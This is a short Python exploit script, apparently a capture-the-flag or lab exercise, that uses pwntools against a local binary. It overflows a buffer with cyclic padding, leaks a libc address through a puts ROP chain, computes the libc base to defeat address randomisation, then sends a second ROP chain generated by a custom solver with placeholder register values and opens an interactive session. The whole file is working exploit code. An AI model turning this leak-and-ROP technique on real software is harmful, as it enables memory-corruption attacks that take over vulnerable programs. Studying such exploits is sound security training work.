from pwn import *
import solve

def ropChain(base):
    dests = {'eax': 0x41414141, 'ebx': 0x10, 'ecx': 0, 'edx': 0x42424242, 'edi': 0x33}
    txtGadgets = solve.readGadgets('./util/libcGadget.txt')
    gadgets = solve.parseGadget(txtGadgets)
    payload = solve.solve(dests, gadgets, base)
    print(repr(payload))
    return payload

context.terminal = 'screen'
binary = './util/a.out'
p = process(binary)
gdb.attach(p)

padding = cyclic(cyclic_find('baab'))
elf = ELF(binary)
addr_bss = elf.bss()

rop = ROP(elf)
rop.puts(0x8049880)
rop.main()

p.clean()
p.sendline(padding + str(rop))
s = u32(p.recv()[:4])
base = 0xf7e11000 + (s - 0xf7fc35a0)

payload = ropChain(base)
p.sendline(padding + payload)

p.interactive()
